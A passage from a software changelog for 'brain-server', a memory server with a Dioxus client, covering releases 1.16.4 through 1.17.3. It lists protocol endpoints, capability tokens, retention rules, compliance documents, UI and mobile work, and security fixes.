  `writable`, `audit`); `POST /ump/remember` (partial record → lowered
  through the structured-ingest path; §3.7 gates — declared
  `scope.owner` must match the principal, consent violations →
  `forbidden_scope`/`consent_violation`; `{id, result: created|merged|
  rejected}`); `GET /ump/memory/{id}` (integrity-verified on read, §2.8 —
  tampered records dropped); `POST /ump/recall` (§3.2 `{results:[{record,
  score, signals{similarity,recency,salience,scope_match,provenance_depth}}]}`
  over the shared `run_recall` core — the existing gates/injection guard/
  embedding/routing/hybrid+graph RRF/packing are byte-identical, two
  consumers); `POST /ump/revise` (patch → new chunk + `resolve_supersession`
  → `{id: urn:ump:NEW, supersedes:[OLD]}`); `POST /ump/forget` (`{reason,
  hard}` — `hard:false` soft-flags, `hard:true` takes the v1.14
  `purge_chunk_ids` erase path, both tombstoned + audited); `POST
  /ump/feedback` (outcome `followed|overridden|ignored|contradicted` → the
  suggest-feedback last-wins upsert with the granular `ump_outcome`
  persisted); `GET /ump/subscribe` (SSE change feed over a tokio broadcast
  channel — `{kind, id}` events only, never record bodies; kill-switch-safe,
  bounded); `POST /ump/audit` + `GET /ump/audit/verify` (§9 reference
  facility: thin aliases over `list_audit` + `verify_chain`,
  `capabilities.audit: true`). **Batch ingest** — `POST /ingest?format=ump`
  accepts a UMP 1.0 batch envelope `{ump:"1.0", records:[…]}` (single record
  still accepted, back-compat); per-record status, one failure does not
  abort the batch.
- **M3 — MCP tools (`ump.*`, spec §4.1 PRIMARY)** — `src/bin/mcp.rs`
  mirrors the full ops surface: `ump.capabilities`, `ump.remember`,
  `ump.get`, `ump.recall`, `ump.revise`, `ump.forget`, `ump.feedback`,
  `ump.audit`, `ump.audit.verify` (same thin HTTP-proxy shape as the
  existing tools; token passthrough via `BRAIN_TOKEN_FILE`/`BRAIN_TOKEN`).
- **M4 — File binding (`*.ump.md` / `*.ump.json`, spec §4.3)** — `GET
  /export?format=ump-md` renders the portable export as the §6.3 markdown
  projection (front-matter `ump`/`id`/`kind`/`scope`/`time`/`provenance` +
  body; parse via the `vault.rs` parsers, round-trip lossless); `POST
  /ingest?format=ump-md` parses the same projection back through the
  shared lowering. `brain ump export|import` CLI carries both wire forms
  with `--output`/`--input` file paths. Fix: the v1.17.1 `/export` drop on
  DBs with empty `knowledge` (a fatal row-mapping bug) — `observed_secs`
  is now `pub(crate)` and `knowledge_row_to_json` reads `Option<String>`
  timestamps; pinned by `export_mapping_survives_real_timestamp_rows`.
- **M5 — Identity + capability tokens (spec §5)** — new pure lib module
  `src/ump_integrity.rs` (`#![deny(unsafe_code)]`, the `brain_server::eval`
  precedent): `did_key_from_ed25519` (multicodec `0xed` + base58btc →
  `did:key:z6Mk…`), RFC 8785 JCS canonicalization (BTreeMap), blake3 →
  base32 content hashes, ed25519-dalek sign/verify (§2.8 `integrity`
  signatures), and §5.2 compact capability tokens (`alg.payload.sig`,
  `{iss, verbs:[read|write|derive|export], scope:{project}, exp}`).
  `brain ump keygen [--dir]` CLI writes an Ed25519 seed to
  `BRAIN_UMP_KEY_DIR` (default `~/.config/brain-server/ump/operator.key`,
  0600, refuses overwrite) and prints the DID. **Enforcement:** a
  capability token presented as `Authorization: Bearer` on `/ump/*` +
  `/export` is verified (key, signature, expiry) at the auth middleware,
  then verbs × scope are enforced per handler (`cap_gate` after
  `authorize` — reads need `read`, writes `write` or `derive`, export
  paths `export`; scope must be absent/empty or `global`; `audit`/
  `audit/verify` deny capability bearers — no admin verb exists).
  Unknown/malformed/expired → `unauthorized`. The §5.3 injection-resistant
  rehydration obligations (server: verify-before-emit + scope/consent
  filter before ranking — already the recall pipeline order; client:
  structural framing, never-execute-body) are documented in
  `API_CONTRACT.md` + `SECURITY.md`.
- **Docs** — `API_CONTRACT.md` gains a §UMP binding (levels, routes,
  tokens, redact semantics, §5.3 note); `COMPLIANCE.md` maps the UMP
  integrity + consent controls; `SECURITY.md` covers UMP key storage
  (same 0600/0700 posture as `BRAIN_JWT_KEY_DIR`) + injection-resistant
  rehydration; `openapi.yaml` → 1.17.3 (10 `/ump/*` routes + 2 well-known
  docs + batch/ump-md `format` values + `UmpRecord`/`UmpCapabilities`/
  `UmpRecallResponse`/`UmpFeedbackRequest`/`UmpBatchRequest`/`Integrity`
  schemas). Version 1.17.2 → 1.17.3.

### Honest ceilings

- Conformance is **self-attested** — the §7 level definitions are mapped
  onto the shipped surface, not certified by a third party.
- L3 in §7 means the local integrity layer (sign/verify with the operator
  key); A2A federation, remote agent identity, and per-tenant key
  hierarchies remain v2.x.
- `GET /ump/subscribe` is a change signal, not a data channel — event
  bodies are intentionally absent (documented §3.8 posture).
- Batch import lowers records one-by-one through the existing ingest path;
  no parallel ingestion, no partial-transaction rollback (per-record
  status is the contract).
- The `did:key` emission is Ed25519 only (same documented posture as the
  v1.2 JWKS EC/Ed gap); RSA capability keys are out of scope.
- Client-side §5.3 obligations are documented, not enforced by the server.



## [1.17.2] — 2026-08-09
### Release notes

- **Bug fixes:** The UMP export/import adapter shipped with a guessed wire format that real UMP 1.0 software would not understand; records now conform to the published spec — correct version tag, kind vocabulary, content-addressed ids, RFC 3339 timestamps, and relation shapes.
- **Improvements:** Imports now reject records declaring an unknown protocol major version instead of silently reinterpreting them.
- **Improvements:** The server declares UMP 1.0 / L0 (portable-record file binding) conformance.
### Engineering record


### Server — "Harden"

- **UMP adapter conforms to the actual UMP 1.0 spec** — the v1.17.1 adapter
  shipped a guessed "0.1" wire shape; the real spec is **Universal Memory
  Protocol 1.0** (github.com/edihasaj/universal-memory-protocol, SPEC.md).
  Conformance changes: records now carry `"ump": "1.0"`; the five-kind
  vocabulary (semantic/episodic/procedural/working/identity — the invented
  `declarative` mapping is gone; `decision` lowers to `semantic`); ids are
  content-addressed per §6.2 (`urn:ump:<content_hash>`, fallback
  `urn:ump:brain:<domain>:<id>` for hashless legacy rows); `time.*` is RFC
  3339 (§2.3 REQUIRED string form, round-tripped from brain naive-UTC);
  top-level `relations` use the §2.5 `{type, target}` shape (`about` =
  from-entity, typed link = to-entity) while the lossless graph stays in
  `body.structured`; and §8 is honored — import rejects an unknown `ump`
  major version instead of reinterpreting it. Conformance claim:
  **UMP 1.0 / L0** (portable-record file binding).



## [1.17.1] — 2026-08-09
### Release notes

- **Bug fixes:** Ingest now consistently records the acting user as the record owner, so authenticated writes carry the correct subject instead of an inconsistent one.
- **Per-kind retention** — each memory kind expires on its own schedule (defaults overridable), enforced at query time; the decayed list explains why each item expired.
- **Improvements:** `brain eval` runs a fixed query set against recall and enforces quality floors, usable as a pre-ship gate.
- **Governance records** — an Article 30 processing register, a public EU AI Act Code-of-Practice conformity marker, an AI-literacy disclosure endpoint, and a deployer playbook plus RFP response kit.
- **Snapshot self-check** — verify each backup exists, has correct permissions, and passes integrity and audit-chain checks, from the CLI.
### Engineering record


### Server — "Govern"

- **M1 ingest-owner correctness fix** — `/ingest` now seeds `owner` from the
  principal consistently (`gate::principal_to_owner` is `pub` and wired into
  the direct-ingest sites), so JWT-mode rows carry the acting subject and the
  record-level scope story is coherent on writes.
- **M2 per-kind retention policy** — new `GET/POST /retention` (POST = Admin
  + audited): kind-default expiry (`fact:365, episodic:30, procedure:730,
  step:730, decision:730` days, overridable via `BRAIN_RETENTION_KIND_DAYS`)
  enforced **at query time** in `push_gate_filters` (per-kind `expires_at`
  disjunction), never by a sweeper. `/decayed` now reports
  `effective_expiry`/`memory_kind`/`reason` (`per_chunk` vs `kind_policy`).
  Additive `retention_policy` table; schema stamp 1.17.1.
- **M3 recall ship-gate CLI** — `brain eval` runs the frozen 32-query
  fixture (`tests/fixtures/eval_queries.md`) against `/recall` and asserts
  floors (`--floor r5=0.85 …` or `BENCH_RECALL_FLOOR`); `brain bench` gains
  the same floor gate. `brain_server::eval` metric fns shared by both.
- **M4 UMP wire adapter** — `GET /export?format=ump` re-renders the portable
  export as UMP records with a name-based per-chunk graph; `POST /ingest?format=ump`
  lowers a UMP envelope back into the structured-ingest path. Round-trip is
  identity on row fields (pinned by tests); batch import is a documented v2.x
  ceiling. *(Wire shape was corrected to the actual UMP 1.0 spec in [1.17.2].)*
- **M5 Art 30 register** — new `GET /art30` (Admin): the activities register
  every controller must maintain (categories of data, purposes incl. explicit
  consent/controller obligation, retention, provenance), projected from the
  existing tables. `BRAIN_CONTROLLER_NAME` names the controller.
- **M6 CoP marker** — new `/.well-known/cop-notice` (public): machine-readable
  EU AI Act Code of Practice conformity state (self-attested; commitments +
  self-assessment link + `last_review`) for the client's CoP icon lane.
- **M7 snapshot self-check** — new `GET /snapshot/status` (Admin) + `brain
  snapshot-status`: per `VACUUM INTO` `.bak` — exists, size, `0600`, `PRAGMA
  integrity_check`, audit-chain verify. No new backup writer.

### Tests

- 451 server tests (+5: UMP round-trip/kind-mapping/malformed-reject, UMP
  export renderer, CoP marker) + 5 brain-bin tests; clippy `-D warnings` +
  fmt clean.

### Docs

- **`docs/AI_LITERACY.md`** (new) — EU AI Act Art 4 deployer playbook: what
  the memory component is/is not, the inspectable controls that are the
  literacy substance (trace, proposal gate, quarantine, DSAR, audit chain),
  and a weekly verify + DSAR-drill cadence. Cross-linked from `COMPLIANCE.md`
  §6.4 and `README.md`.
- **`docs/RFP_RESPONSE_KIT.md`** (new) — map brain-server features to common
  enterprise RFP sections (security, privacy/DSAR, AI governance, ops) with
  the evidence artifact behind each claim.
- **`GET /.well-known/ai-literacy`** (new, public) — machine-readable Art 4
  disclosure pointing at the playbook + enumerating the inspectable controls,
  mirroring the Art 50 ai-notice route. Registered in both auth-public path
  lists, the router, and `openapi.yaml`; pinned by a unit test.
- **COMPLIANCE.md** — §7 now references the live `/.well-known/ai-notice`
  disclosure (Art 50 machine-readable origin notice); §6.4 points at
  `/.well-known/ai-literacy` + `docs/AI_LITERACY.md`. §7.1 (new, this
  release) documents the CoP marker.
- **Wiki mirror** — the three `docs/` artifacts (AI_LITERACY, RFP response
  kit, MemGhost mitigation) mirrored as hand-authored wiki pages
  (`AI-Literacy`, `RFP-Response-Kit`, `MemGhost-Mitigation`) and wired into
  `_Sidebar` + `Home` quick links, so the procurement-facing wiki surfaces
  the same governance story as the repo.



## [1.17.0] — 2026-08-08
### Release notes

- **Improvements:** Refresh controls on the Review, Audit, and Health panels work on every platform, including mobile.
- **Improvements:** `brain://` deep links are registered on iOS and Android, so custom-scheme links open the app.
- **Improvements:** The connect screen remembers the last successful server URL and pre-fills it on return; the token stays in the OS keyring.
- **Improvements:** Store-readiness package: App Store / Play privacy labels ("no data collected" — self-hosted backend, no analytics or tracking) and a submission checklist.
### Engineering record


**v1.17.0 "Mobile" — client-only.** Completes the v1.17.0 Mobile plan on top of
the v1.16.6 mobile groundwork (secure token storage seam + responsive bottom-tab
UX). The M1 (Keychain/Keystore seam) and M2 (nav swap / sheet / touch targets /
safe-area) halves shipped as v1.16.6; this release lands the remaining mobile +
store-readiness milestones. Server + API contract unchanged (still 1.16.7).

### Added (client)

- **M2.4 portable refresh control** (`panels/mod.rs::RefreshButton`) — Review,
  Audit, and Health now expose a refresh trigger that bumps their existing
  `refresh` signal (re-fetch). Works on every renderer; the native
  pull-to-refresh *gesture* remains a documented v1.18.0 ceiling (needs touch
  events — untestable without `dx serve`).
- **M3.3 deep-link intent filters** (`Dioxus.toml`) — iOS `url_schemes = ["brain"]`
  + an Android `VIEW`/`BROWSABLE` intent filter for the `brain://` scheme, so a
  custom-scheme link opens the app into the existing `Routable` router. Full
  https universal-link parity is v1.19.0.
- **M3.4 offline connect pre-fill** (`main.rs`) — the connect screen persists the
  last successful base URL (non-secret UI pref via the existing `i18n` localStorage
  seam; the token stays in the OS keyring only) and pre-fills the URL field on a
  returning/offline connect. The specific `/health` failure was already shown (no
  crash); the field now comes pre-populated too. Pure `prefill_if_empty` guard +
  test.
- **M3.1 store-readiness** (`client/STORE_READINESS.md` new) — App Store / Play
  privacy-nutrition labels ("no data collected", accurate: one self-hosted
  backend, no analytics/tracking/third-party SDKs) + icon/launch/screenshot +
  submission checklist. Icon/screenshot generation + store upload are operator
  steps.

### Fixed / Changed (client)

- Client version 1.16.8 → 1.17.0.

### Tests

49 client tests (was 48; +1 `offline_prefill_fills_empty_field_only`). Clippy
`-D warnings` + fmt + wasm build clean.

### Honest ceilings (carried into v1.18.0)

- Native iOS/Android artifacts (`dx bundle --platform {ios,android}`) are an
  **operator step** — requires code signing + an Android SDK, neither present in
  this environment. The one-codebase compile is covered by the desktop + wasm
  builds; the platform glue ships in `Dioxus.toml` + `storage.rs`.
- Pull-to-refresh is a button today; the native gesture (touch events) is v1.18.0.
- `brain://` deep links are registered but not fully routed to distinct panels
  yet — URL parity is v1.19.0.
- App-store review is an external gate (low risk: "no data collected" + a
  governance tool, not social/UGC).



## [1.16.8] — 2026-08-08
### Release notes

- **Bug fixes:** Web deployments could ship stale CSS — style edits silently never reached the bundle; the build now recompiles styles every deploy.
- **Five UI languages** (English, German, French, Spanish, Dutch) with automatic English fallback for missing strings.
- **Light theme** toggle (dark remains the default) and a **compact density** mode (~12.5% tighter spacing) for high-volume reviewers.
- **Improvements:** Locale-aware number grouping throughout the shell.
- **Improvements:** A privacy panel on the connect screen states exactly what the client sends, stores, and never does (no telemetry, analytics, or third-party requests); theme, density, and locale preferences persist — never the token.
### Engineering record


Client-only release: the v1.16.8 "Global" plan — locale (i18n) + light/dark
theme + density + locale-aware number formatting + a privacy block on the
connect screen. **Server + API contract unchanged** (server stays at 1.16.7).

### Client — Added

- **M1 i18n (`src/i18n.rs` + `locales/*/main.ftl`).** Zero-dependency FTL-subset
  translation: `en`/`de`/`fr`/`es`/`nl` bundles are compiled in at build time via
  `include_str!` and parsed once. `t()` resolves current-locale → `en` → the key
  itself (visible fallback, never blank), so a partial locale degrades to English.
  A `locales/<code>/main.ftl` file is added per language; RTL-ready via `is_rtl`.
  `fluent`/`fluent-langneg` are the documented upgrade path (ponytail: a simple
  key=value subset + a three-tier fallback is a fraction of a Fluent dependency
  for human-authored short strings).
- **M2 RTL readiness.** `dir` on `<html>` flips to `rtl` for `ar`/`he`/`fa`/`ur`
  locales (none ship in v1.16.8; the layout + CSS are RTL-ready when one is added).
- **M3 light theme.** A top-bar toggle flips `data-theme="light"` on `<html>`;
  `input.css` swaps every token (dark-first stays the default), keeping the state
  hue *names* identical so the recall/security tests pinning them need no change.
- **M4 density.** A toggle flips `data-density="compact"` on `<html>` (14px root
  font, ~12.5% denser rem-based spacing) — a pure CSS knob, no JS, for high-volume
  reviewers. Comfortable is the default.
- **M5 locale-aware numbers.** `format_number` groups per locale (`en` → `,`,
  `de`/`fr`/`es`/`nl` → `.`), wired into the shell pending/flags counts. Deviates from
  the plan's `Intl.NumberFormat`-via-`document::eval` because eval is async (no
  sync path in Dioxus 0.7); the pure fn is synchronous + testable.
- **M6.2 privacy block.** The connect screen now has a `<details>` transparency
  panel stating exactly what the client sends (URL + token, token to the backend
  only), stores (nothing on web — the v1.16.1 in-memory posture; the OS keyring on
  native), and never does (no telemetry, no analytics, no third-party requests).
  Locale-aware like the rest of the shell.
- **Pref persistence.** Theme / density / locale are persisted to web
  `localStorage` (best-effort, sanitized, non-sensitive) and restored on launch;
  never the auth token (`credentials_stay_in_memory` guard still enforced).

### Client — Changed

- **Shell chrome localized** — rail + mobile tab-bar nav, top-bar counts,
  pending/flags/audit badges, connection + principal pillars, sign-out, degrade
  banners, and the context drawer header all render through `t()` (precomputed
  locals so the `rsx!` text-node interpolation never holds a nested `t("…")` call).
- **`deploy-web.sh` now compiles Tailwind.** `dx bundle` does **not** recompile
  Tailwind in build mode (the `[tailwind] input` here is `styles/input.css`, not a
  root `tailwind.css`, so dx's auto-watch never fires) — it copies+hashes the
  pre-built `assets/tailwind.css`, so CSS edits silently never reached the bundle
  (the stale-CSS class of bug Agent 50 fixed). The script now runs
  `npx @tailwindcss/cli -i styles/input.css -o assets/tailwind.css` first, per the
  Dioxus 0.7 docs. Verified: the fresh bundle carries `data-theme`/`data-density`.

### Client — Tests

- **48 passed** (was 43; +5 i18n tests): `resolve` fallback chain, per-locale
  `group_digits`, RTL detection, persisted-pref sanitizers, and a guard that every
  locale's keys exist in `en` (the `.ftl` files actually load). Pure cores are
  signal-free so the unit tests need no Dioxus runtime.

### Fixed

- **Dioxus global signals** exposed as accessor `fn`s (not `static`s) — a `static
  Signal` can't be mutated (`.set()`) without an immutable-static borrow error;
  the accessor-fn pattern is Dioxus' documented idiom for global state.

### Honest ceilings (carried into v1.17.0)

- The i18n is a simple FTL subset — no ICU plurals/term references, no message
  arguments (all strings are static; numbers are concatenated). `fluent` is the
  upgrade path.
- `fr` digit grouping uses `.` (a narrow no-break space would be more correct).
- No RTL locales ship yet; `dir` + CSS are ready but unexercised by a real RTL
  string set (a buyer locale is the acceptance test).
- Theme/density are cosmetic (no system-color-scheme auto-follow); `color-scheme`
  flips correctly.
- The `.ftl` files are hand-maintained alongside the string keys — a missing key
  degrades to the key name (visible) rather than failing, by design.



## [1.16.7] — 2026-08-08
### Release notes

- **Bug fixes:** The `limit` parameter on the deletion registry was silently ignored, always returning all rows; it is now honored.
- **Bug fixes:** Export now includes the record source column it was documented to emit.
- **Web client** — installable as a PWA with an offline app shell, and review-proposal / DSAR-certificate pages are now shareable URLs.
- **Web client** — command palette (Cmd/Ctrl+K), paginated audit log with load-more, and a debounced recall input.
- **Improvements:** Accessibility: dialogs trap focus, batch and certificate outcomes are announced to screen readers, and RTL-scripted memory content flows correctly.
- **Improvements:** New public AI-transparency notice endpoint (EU AI Act Article 50) disclosing that AI-generated content is stored and may be returned.
- **Security fixes:** SQLite snapshot backups were written world-readable — each is a plaintext copy of the whole store; they are now restricted to owner-only access.
- **Security fixes:** The unauthenticated health endpoint is pinned to never expose store contents or personal data.
### Engineering record


Server + client release. **Server** (Cargo.toml 1.16.6 → 1.16.7): hardening +
compliance round (security + fixes + Art 50), landing on top of the client
release below. **Client** (1.16.6 → 1.16.7): the "Integrated" plan. No
client or API-contract break.

### Server — Security

- **Snapshot permissions (P0).** SQLite snapshots written by the integrity
  loop (`integrity.rs`) and the restore/import safety snapshot (`backup.rs`)
  were created with the process umask (world-readable `0644`); each is a
  plaintext copy of the whole store. All three `VACUUM INTO` sites now chmod
  the resulting `.bak` to `0600`.
- **`/health` never leaks content.** Extracted the response into a pure
  `health_body()` builder and pinned a regression test asserting the top-level
  key set carries no content/PII/text field (CVE-2026-29787 class: an
  unauthenticated health endpoint disclosing store contents).

### Server — Added

- **`GET /.well-known/ai-notice`** (EU AI Act Art 50 transparency). New public
  route + handler + pure builder disclosing that the service stores and may
  return AI-generated content, with origin-metadata + effective date. Registered
  in both auth-public path lists, the router, and `openapi.yaml`.
- **`docs/MEMGHOST_MITIGATION.md`** — operator-facing map of the MemGhost
  memory-poisoning attack (arXiv 2607.05189) onto brain-server's HITL /
  audit / DSAR / provenance controls. Linked from `docs/README.md`.

### Server — Fixed

- **`GET /tombstones?limit=` was silently ignored.** The query struct had no
  `limit` field, so the param was accepted and dropped, returning all rows.
  Now honored (default 100, clamped to `MAX_TOMBSTONES`).
- **`/export` omitted the `source` column** COMPLIANCE.md §7 claims it emits.
  Added `source` to the export SELECT + per-row JSON (back-compat additive).
- **Test isolation.** `v1_export_import_roundtrip_preserves_data` ran
  `run_migration` (which builds the `vec0` index) without `register_sqlite_vec()`,
  so it only passed in the full suite via a sibling test's global side-effect
  and failed in isolation (`no such module: vec0`). Now self-registers, matching
  every other migration test.

### Server — Changed

- COMPLIANCE.md stamp updated 1.16.2 → 1.16.7.

### Client — Added

- **M1 — Deep links.** Two new routes (`/review/:proposal_id`,
  `/subjects/certificate/:dsar_id`) make the proposal-detail and DSAR-
  certificate views URL-addressable; `RecallTrace` (`/recall/:trace_id`,
  shipped in v1.16.0) completes the set. Leaf components (`ReviewDetail`,
  `DsarDetail`) render the same data a panel's drawer would, and the review
  card title + certificate subject are now real `<Link>`s. Pure helpers
  `locate_proposal`/`subject_of` pinned by tests.
- **M2 — PWA.** `client/pwa/manifest.webmanifest` (standalone, `#0b0d10`
  theme) + `client/pwa/sw.js` (offline shell: caches only `/app/index.html`
  + `/app/assets/*`, never the API; navigation falls back to the shell).
  `deploy-web.sh` ships both into `dist/` and injects the manifest link,
  theme-color, and service-worker registration into `index.html`.
- **M4 — Paginated audit.** `GET /audit?offset=` (server, `OFFSET` in the
  SQL) + a client Load-more button with a boundary-id dedup guard. The
  server `recent_tenant` now pages; the client fetches 100 at a time.
- **M5 — Command palette.** ⌘K / Ctrl+K overlay listing navigation targets +
  a sign-out action, filterable and keyboard-navigable (↑/↓/Enter/Esc).
  Pure `palette_commands`/`filter_commands`/`command_label` pinned by tests.
- **M6 — Recall debounce.** The recall query input commits 300ms after typing
  stops (generation-guarded so a stale pending timer never overwrites a newer
  query). Pure `debounce_commit` pinned by a test.

### Client — Hardened

- **M7.3 — Drawer focus trap.** Tab / Shift+Tab now cycle focus inside the
  dialog (hand-rolled `document::eval`; the `dx components add dialog` route
  is unreachable — registry dead — so the shadcn/Radix upgrade stays a
  documented ceiling).
- **M7.5 — aria-live regions.** `role="status"` + `aria-live="polite"` on
  the review batch summary, the DSAR certificate chain badge, and the audit
  export announcement — mutation outcomes are read aloud.
- **M7.6 — RTL.** `<html dir="auto">` injected at deploy time so memory
  content in RTL scripts flows correctly while the shell stays LTR (no i18n
  extraction — that is v2.x).

### Client — Fixed / changed

- **M3 wasm-split is a documented ceiling, not code.** Dioxus 0.7.10 has no
  wasm-split feature and the official docs still list bundle splitting + lazy
  components as "planned". No code — recorded in the plan.
- **M7.7 stays an operator/native-toolchain step** (no Android SDK /
  cargo-ndk here): lib.rs mobile entry, probe pause/resume, store readiness,
  MASVS tables are documented, not compiled in.

### Verification

- Client: 43 tests, `clippy --all-targets -- -D warnings` clean, `cargo fmt
  --check` clean, `cargo build --target wasm32-unknown-unknown` clean.
- Server: 436 lib + audit/integration green (`cargo test --features
  bench,migrate`); the only server change is the additive `offset` param on
  `/audit`.
- Live `/app`: 200; `/app/manifest.webmanifest` + `/app/sw.js` 200; dist
  carries the hashed JS/WASM/CSS + manifest + sw + `dir="auto"`.

### Honest ceilings (carried into v1.16.8)

- **M3 wasm-split not built** (Dioxus upstream, not yet implemented).
- **Drawer focus trap is hand-rolled** (`document::eval`), not the shadcn/
  Radix Dialog with full focus restoration — `dx components add dialog` can't
  run (registry unreachable).
- **RTL is `dir="auto"` only** — no i18n string extraction, no per-locale
  switch (v2.x).
- **M7.7 Mobile milestones remain operator/native-toolchain steps.**

---



## [1.16.5] — 2026-08-08
### Release notes

- **Bug fixes:** Fixed a concurrency flaw in the client's request path: an internal lock was held across a network call.
- **Session lifecycle** — expired access tokens are silently refreshed once on a 401 and proactively within 60 seconds of expiry; no infinite retry loops.
- **Improvements:** The top bar shows the acting identity from the token ("acting as <subject>" vs "loopback") instead of a hardcoded placeholder.
- **Improvements:** The connect screen accepts an access + refresh token pair, pasteable from the CLI or an identity provider.
- **Improvements:** Clearer auth errors: a reused refresh token reports "session revoked" with a reconnect path instead of a generic failure.
### Engineering record


### "Secure" (client-only — JWT refresh lifecycle + principal)

Client 1.16.4 → 1.16.5; server + API contract unchanged. The client's JWT
lifecycle: refresh-on-401, principal identity display, session-expiry
awareness, and the honest revocation path. See
`IMPLEMENTATION_PLAN_v1.16.5_Secure.md`.

### Improvements

- **JWT-aware `ApiClient` (M1)** — `TokenClaims` (sub/exp/scope/team) +
  `decode_claims()` (base64url-payload decode, no crypto — brain-server
  verifies on receipt; the client reads claims for display + expiry only).
  `with_principal()`/`with_refresh_pair()` derive the identity pillar from the
  JWT `sub` claim; `derive_principal()` distinguishes opaque loopback tokens
  (None) from JWT-shaped ones.
- **Principal display (M2)** — the top bar shows `acting as <sub>` for JWT
  tokens, `loopback` for opaque ones (replaces the hardcoded `remote-user`
  placeholder in Connect). The Intent-Based-Auditing identity pillar.
- **Refresh-on-401 (M3) + pre-emptive refresh (M5.1)** — a `request_with_refresh`
  wrapper silently refreshes once on 401 and retries the original request;
  `needs_refresh()` refreshes proactively when the access token's `exp` is
  within 60s. One retry only — no infinite loop.
- **Connect screen JWT mode (M4)** — a token / JWT-pair radio toggle (access +
  refresh pasted from `brain key mint` or an IdP).
- **Revocation-aware errors (M6)** — `error_message()` maps `refresh_reuse_
  detected` → "session revoked", 401 → "session may have expired" with a
  reconnect path.

### Fixed

- **`request()` no longer holds the `RwLock` guard across an await**
  (clippy `await_holding_lock`) — the access token is cloned out before the
  send.

### Security

- No crypto client-side — the client never verifies a JWT signature (forged
  JWTs are rejected by brain-server on the next API call). Bearer-header auth
  keeps CSRF structurally impossible (no cookies). BFF/HttpOnly-cookie mode is
  the documented v2.x ceiling.

### Honest ceilings (carried into v1.16.6)

- Token lives in WASM memory for the session lifetime; JS on the same origin
  can read it. Secure storage (Keychain/Keystore) is v1.16.6.
- No PKCE flow (interactive login needs a brain-server `/auth/authorize` or
  IdP proxy — v2.x).
- Concurrent refreshes from two panels are server-safe but the loser logs out;
  a client-side single-refresh mutex is the v1.16.6 polish.

---



## [1.16.6] — 2026-08-08
### Release notes

- **Secure token storage** — on native installs the auth token persists to the OS keyring (macOS Keychain, Windows Credential Manager, Linux Secret Service); the web client keeps it in memory only.
- **Auto-reconnect** — a saved token is quietly validated on launch, dropping you straight into the app when valid and back to the sign-in form when stale.
- **Responsive layout** — a mobile bottom tab bar, at least 44px touch targets, notch/home-indicator safe areas, and a bottom-sheet drawer on small screens.
- **Improvements:** Server and client version numbers are kept in lockstep, so the CLI and GUI report the same version.
### Engineering record


### Server version alignment (no functional server change)

The server `Cargo.toml` was bumped 1.16.2 → **1.16.6** purely to keep the
server and the Dioxus client versions in lockstep — `brain -V` now reports the
same version as the GUI. The server binary is byte-identical in behavior to
1.16.2; this is a version-alignment release, not a code change. `openapi.yaml`
`version`/`x-api-version` and README updated to match.

### "Mobile" (client-only — secure token storage + responsive UX)

Client 1.16.5 → 1.16.6; server + API contract unchanged. This release lands the
two testable milestones of the v1.16.6 "Mobile" plan (M2 secure token storage +
M3 responsive UX). M1 (lib.rs mobile entry), M4 (probe pause/resume), M5 (store
readiness), M6 (MASVS tables) are documented operator/native-toolchain steps —
no Android SDK / cargo-ndk / `dx` is available in this environment.

- **Dioxus pinned to 0.7.10** — the `dioxus = { version = "0.7", … }` spec was
  already semver-open and the lockfile resolves to the newest stable **0.7.10**
  (verified via lockfile + `cargo tree` + crates.io). The 0.7.2→0.7.10 patch
  line carries the security-relevant fixes (0.7.8/0.7.10 wasm-hotpatch
  TOCTOU/UB; 0.7.6 web panic-resilience + `inert` attribute) — already compiled
  in. Plan/doc "Dioxus 0.7.2" references updated to 0.7.10.
- **M2 — secure token storage (`src/storage.rs`)** — a new
  `#[cfg(target_arch = "wasm32")]`-gated seam. On every non-web target the auth
  token persists to the OS keyring (`keyring` 3.6.3: `apple-native` →
  Keychain, `windows-native` → Credential Manager, `sync-secret-service` →
  Secret Service; Android Keystore via `android-native-keyring-store` is the
  documented `dx`-wired ceiling). Web stays in-memory only (no-op — the v1.16.1
  posture; browser localStorage is not a secure credential store). Connect
  saves the token on success **only when one was provided** (`should_persist` —
  a loopback connect never clobbers a saved remote token); a `use_resource` on
  launch silently probes `/health` with any saved token and jumps straight to
  Review, falling through to the normal form on a stale/revoked token.
- **M3 — responsive UX (CSS-driven, no forked routes)** — AppShell renders both
  a desktop rail and a new mobile bottom **tab bar** (`nav.tab-bar` + `TabLink`,
  same `Routable` targets → identical a11y nav); pure `@media (min/max-width:
  640px)` swaps them with no viewport JS. `.tab-link` enforces ≥44px touch
  targets (iOS HIG / Material). `.tab-bar` and the drawer consume
  `env(safe-area-inset-bottom)` (notch / home indicator). The context drawer is
  now `.drawer` — a right rail ≥sm, a full-width rounded bottom sheet <640px.
- **Version**: client 1.16.5 → 1.16.6 (client-only). 37 client tests (was 36),
  clippy `-D warnings` + `cargo fmt --check` clean, desktop + `wasm32-unknown-unknown`
  builds clean, Tailwind v4.3.3 compiles `styles/input.css` (responsive rules
  present in output).

---



## [1.16.4] — 2026-08-08
### Release notes

- **Bug fixes:** Deployments could ship a stale stylesheet while the page referenced the new one; the deploy script now always picks the freshest CSS build.
- **Redesigned app shell** — a fixed left sidebar with live count badges and a slim sticky top bar showing connection, pending count, and security/audit-chain status.
- **Improvements:** A shadcn-style design system: semantic color tokens, a radius scale, and consistent buttons, inputs, badges, and tables.
- **Improvements:** Every panel (Review, Recall, Subjects, Security, Audit, Health, Connect) restyled to the new system with no loss of accessibility or semantics.
### Engineering record


### "Styled" (client-only shadcn/ui design-system restyle)

- **Sidebar dashboard shell** — `AppShell` moved from a top nav rail to a fixed
  left sidebar (brand mark + grouped `nav-link` pills with live count badges on
  the rail) + a slim sticky top bar (connection dot, pending count, Security
  flags + Audit-chain badges, principal). The right-hand context drawer is a
  `card`. No layout semantics changed — every nav target stays a real `<Link>`,
  every action a real `<button>` (the `interactive_elements_are_buttons` gate
  still passes).
- **shadcn-style component layer in `input.css`** — semantic tokens
  (`--color-background/foreground/card/popover/muted/accent/destructive/border/
  input/ring`) mapped onto the app's own AA-verified palette (state hues
  `ok`/`warn`/`danger`/`info`/`neutral` kept by name), a radius scale
  (`--radius-sm…2xl`), subtle shadows, and reusable classes: `.card`,
  `.btn`/`.btn-primary`/`.btn-outline`/`.btn-secondary`/`.btn-ghost`/
  `.btn-destructive`/`.btn-sm`/`.btn-md`, `.input`/`.select`, `.badge` +
  state badges, `.nav`/`.nav-link`/`.nav-badge`, and `.table`.
- **Every panel restyled to the layer** — Review, Recall (+ trace card),
  Subjects (DSAR cert card), Security (chain card + quarantine + auth-failure
  table), Audit (filter bar + table), Health (Service + Corpus cards), and the
  Connect screen (branded card) all use the new tokens/classes. All tests,
